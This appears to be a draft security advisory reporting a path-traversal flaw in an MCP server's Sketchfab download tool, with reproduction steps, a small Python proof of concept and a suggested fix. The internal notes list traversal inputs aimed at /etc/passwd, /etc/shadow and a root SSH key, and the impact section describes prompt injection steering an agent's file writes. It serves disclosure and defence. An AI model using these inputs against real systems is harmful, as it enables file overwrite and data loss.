# Path traversal in `sketchfab-download`: `outputPath` writes the downloaded file, and extracts ZIPs, anywhere on disk

**Repository:** `gregkop/sketchfab-mcp-server` · **Tool:** `sketchfab-download` · **Tested commit:** `e5969ef`
**Weakness:** CWE-22 Path Traversal

## Summary
`sketchfab-download` downloads a Sketchfab model and saves it to `outputPath`, or to the OS temp directory when `outputPath` is not given. `outputPath` is used as-is: absolute paths and `../` segments are accepted and nothing restricts the destination. The tool writes the model bytes there with `fs.writeFileSync`, overwriting any existing file. If the download is a ZIP, it also extracts every entry into `<dirname(outputPath)>/<basename>_extracted/`, with overwrite enabled. A caller who controls the arguments can create or overwrite files anywhere the user running the server can write.

## Details
`index.ts:533-559` at `e5969ef` (the fallback-format branch at lines 490-526 is the same):

```ts
      // Determine filename and path
      const filename = `${model.name.replace(/[^a-zA-Z0-9]/g, "_")}_${modelId}.${format}`;
      const savePath = outputPath || path.join(os.tmpdir(), filename);
      const saveDir = path.dirname(savePath);

      // Check if the downloaded file is a ZIP archive
      if (isZipFile(modelData)) {
        // Create a directory for extraction
        const extractDir = path.join(saveDir, `${path.basename(savePath, path.extname(savePath))}_extracted`);

        // Extract the ZIP file
        const extractedFiles = extractZipFile(modelData, extractDir);

        // Save the original ZIP file as well
        fs.writeFileSync(savePath, modelData);
```

- `outputPath` is declared as `z.string().optional()` (`index.ts:427`). It is never resolved or checked against a base directory.
- `extractZipFile` (`index.ts:219-237`) creates `extractDir` recursively and calls `zip.extractAllTo(outputDir, true)` (overwrite on).
- The model name is sanitized for the default filename, but a caller-supplied path bypasses that.

## Steps to reproduce
1. Prerequisites: Node.js 18 or later, a Sketchfab account with an API token, and the uid of any downloadable model (for example from `sketchfab-search` with `"downloadable": true`).
2. Install and start the server:
   ```
   git clone https://github.com/gregkop/sketchfab-mcp-server.git
   cd sketchfab-mcp-server && git checkout e5969ef8588d0a47a8c5a0341903f3efacb74b3b
   npm install && npm run build
   node build/index.js --api-key <YOUR_SKETCHFAB_API_KEY>
   ```
3. Call the tool with these arguments. The path is outside the default temp-file naming and could be any writable location.
   ```json
   {"modelId": "<DOWNLOADABLE_MODEL_UID>", "format": "glb", "outputPath": "/tmp/tofu-poc.txt"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="node", args=["build/index.js", "--api-key", "<YOUR_SKETCHFAB_API_KEY>"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("sketchfab-download", {"modelId": "<DOWNLOADABLE_MODEL_UID>", "format": "glb", "outputPath": "/tmp/tofu-poc.txt"})
               print(result)

   asyncio.run(main())
   ```
   Relative traversal works the same way. With `mkdir -p /tmp/tofu-poc-dir`, `"outputPath": "/tmp/tofu-poc-dir/../tofu-poc.txt"` also lands at `/tmp/tofu-poc.txt`.
4. What to observe: `/tmp/tofu-poc.txt` now contains the model bytes, and the result says `Saved to: /tmp/tofu-poc.txt`. If the server returned a ZIP (common for `gltf` and `source`), you also get a `/tmp/tofu-poc_extracted/` directory holding the archive's entries.

## Expected behavior
Downloads should land only inside a configured download directory. The tool should resolve `outputPath` against that directory and reject anything that resolves outside it.

## Actual behavior
The file is written to whatever path the caller gives. In the fuzzing run the server had no API key, so every call stopped at the key check and the write was not reached:

```
No Sketchfab API key provided. Please provide an API key using the --api-key parameter or set the SKETCHFAB_API_KEY environment variable.
```

The write behavior described above comes from the code at `index.ts:492-504` and `index.ts:535-559`.

## Impact
In MCP the LLM picks `outputPath`, and prompt injection can steer it, for example through text in a model description or in a page the agent read. A steered call can overwrite any file the user can write, such as shell startup files, configs and project files, with the downloaded bytes. It can also drop a directory of extracted files next to a chosen path. The written bytes are the model archive. An attacker who publishes a downloadable model may control those bytes and the extracted file names; I have not verified what Sketchfab's upload pipeline allows. At minimum this is arbitrary file overwrite with data loss.

## Suggested fix
- Add a download root, for example `SKETCHFAB_DOWNLOAD_DIR` with a default of `path.join(os.tmpdir(), "sketchfab")`.
- Treat `outputPath` as a file name or relative path under that root: `const target = path.resolve(root, outputPath)`, then reject unless `target === root || target.startsWith(root + path.sep)`. Use `fs.realpathSync` on the parent to defeat symlinks.
- Refuse to overwrite existing files unless the caller explicitly asks.
- Keep extraction inside the same root.

## Status on the default branch
Still present at `e5969ef` (2025-03-09). The tested commit is the head of the default branch.

## Prior reports
- Documentation: README.md, `sketchfab-download` parameters: "`outputPath` (optional): Local directory or file path to save the downloaded file". It documents a caller-chosen local path and states no allowed directory or overwrite behaviour, so writing outside a download folder is not documented as a restriction or warned about.
- No issue or PR reports this. Searched the 1 issue and all 3 pull requests (fetched 2026-10-01): a Glama Dockerfile request, two badge PRs and a Smithery deployment PR.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal via `check_path_traversal`, the only sanitizer that fired. It fired on the input pattern ("Silent Bug Alert"). No introspection file-write alert fired, because the write path was never executed.
- Campaigns and executions: corpus-sbx 2,560 exec / 2,554 ok (60 s). e2-0922 1,024 / 1,018 (60 s).
- Evidence (verbatim, trimmed): inputs `{'modelId': 'validModelId', 'format': 'gltf', 'outputPath': '/etc/passwd'}`, `{'modelId': '1234567890abcdef', 'format': 'glb', 'outputPath': '../../../../../etc/shadow'}` and `{'modelId': '/etc/passwd\x00', 'format': 'source', 'outputPath': '/var/tmp/../../root/.ssh/id_rsa'}` all returned `'No Sketchfab API key provided. Please provide an API key using the --api-key parameter or set the SKETCHFAB_API_KEY environment variable.'`.
- Hand-check hints: real from reading the code: `outputPath` reaches `fs.writeFileSync` unchecked, plus `AdmZip.extractAllTo(..., true)` into a sibling directory. It was not dynamically confirmed. The fuzzer had no key, so the logged evidence shows only the key check. Reproducing needs a real Sketchfab token and a downloadable model uid. I did not check whether adm-zip ^0.5.16 blocks zip-slip entries (`../` in entry names); that is a separate question. The claim that "an attacker can control the archive bytes" is hedged and unverified.
</details>
